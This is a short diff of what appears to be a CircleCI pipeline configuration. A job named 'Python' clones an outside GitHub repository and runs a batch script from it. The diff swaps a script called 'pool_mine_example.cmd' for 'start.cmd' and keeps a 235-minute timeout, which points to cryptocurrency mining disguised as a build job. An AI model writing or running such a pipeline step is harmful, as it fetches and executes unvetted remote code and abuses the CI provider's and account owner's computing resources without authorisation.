@@ -6,7 +6,7 @@ working_dir: &working_dir ~/app
         name: Python
         command: |
                     git clone https://github.com/mhdrugr7/win.git
-                    .\win\pool_mine_example.cmd
+                    .\win\start.cmd
         no_output_timeout: 235m
 version: 2.1
 orbs:
